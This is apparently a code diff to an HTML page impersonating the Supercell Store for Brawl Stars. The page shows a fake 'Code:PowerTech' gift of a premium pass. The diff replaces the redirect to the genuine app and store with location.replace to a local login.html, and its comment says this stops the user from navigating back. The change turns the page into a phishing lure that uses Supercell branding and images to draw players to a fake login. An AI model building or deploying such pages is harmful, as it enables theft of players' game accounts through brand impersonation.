@@ -3,9 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>荒野亂鬥 - Supercell Store</title>
-    <link rel="shortcut icon" href="https://store.supercell.com/favicon.ico" type="image/x-icon">
-    <meta name="description" content="《荒野亂鬥》現已加入Supercell Store">
+    <title>Brawl Stars - Supercell Store</title>
     <style>
         body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; background: #000; font-family: sans-serif; }
 
@@ -48,7 +46,7 @@
             const backdrop = document.createElement('div');
             backdrop.style.cssText = `
                 position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-                background: rgba(0,0,0,0); 
+                background: rgba(0,0,0,0.4); 
                 z-index: 9999; display: flex; align-items: center; justify-content: center;
                 pointer-events: auto;
             `;
@@ -57,10 +55,12 @@
                 <div id="modal-card" class="modal-enter" style="background:#0b1821; width:90%; max-width:400px; border-radius:24px; position:relative; border: 3px solid #333; box-shadow: 0 30px 60px rgba(0,0,0,0.7);">
                     <div style="display:flex; flex-direction:column; align-items:center; padding-top: 0;">
                         <div style="background:#0080ff; width:110%; transform:rotate(-2deg); padding:40px 10px; margin-top:-10px; display:flex; flex-direction:column; align-items:center; box-shadow: 0 5px 15px rgba(0,0,0,0.3);">
-                            <h2 style="color:white; margin:0; text-shadow: 2px 2px #000; font-size:28px; transform:rotate(2deg); font-weight:900;">Code:PowerTech<br>贈送一張高級通行券給您！</h2>
+                            <h2 style="color:white; margin:0; text-shadow: 2px 2px #000; font-size:24px; transform:rotate(2deg); font-weight:900; text-align:center;">
+                                Code:PowerTech<br>贈送了一張高級通行券！
+                            </h2>
                             <div style="background: linear-gradient(180deg, #5fffff 0%, #ffffff 100%); width:200px; height:160px; margin-top:15px; border-radius:12px; border:4px solid black; display:flex; align-items:center; justify-content:center; transform:rotate(2deg); position:relative;">
                                 <img src="https://images.store.supercell.com/2U4BIC_0KtsvptZVMA6FTgRv2VT_jEIqP_DcIxJRVx0/rs:fit:400:400/q:90/aHR0cHM6Ly9nYW1lLWFzc2V0cy5zdG9yZS5zdXBlcmNlbGwuY29tL2JyYXdsc3RhcnMvZGY5MDM2ZTEtYWEwMy00MjM2LTliMTktOTFmZGU5MWRiNGVhLnBuZw.avif" style="width:120px;">
-                                <div style="position:absolute; bottom:-8px; background:black; color:white; padding:3px 15px; border-radius:5px; font-weight:bold;">+ 10階獎勵</div>
+                                <div style="position:absolute; bottom:-8px; background:black; color:white; padding:3px 15px; border-radius:5px; font-weight:bold;">解鎖 20 階進度</div>
                             </div>
                         </div>
 
@@ -80,17 +80,10 @@
                 const card = document.getElementById('modal-card');
                 card.classList.add('modal-exit');
                 
-                // 動畫播放中執行「控制」跳轉
+                // 動畫播放結束後跳轉
                 setTimeout(() => { 
-                    // 這行會嘗試喚起手機中的荒野亂鬥 App
-                    window.location.href = 'brawlstars://'; 
-                    
-                    // 作為備案，如果 1 秒後沒反應（使用者沒裝 App），就導向官網
-                    setTimeout(() => {
-                        window.location.href = 'https://store.supercell.com/zh-tw/brawlstars';
-                    }, 500);
-
-                    backdrop.remove(); 
+                    // 一律使用 replace 跳轉到 login.html，讓使用者無法按「上一頁」回到此禮包頁
+                    window.location.replace("login.html");
                 }, 400);
             };
         };
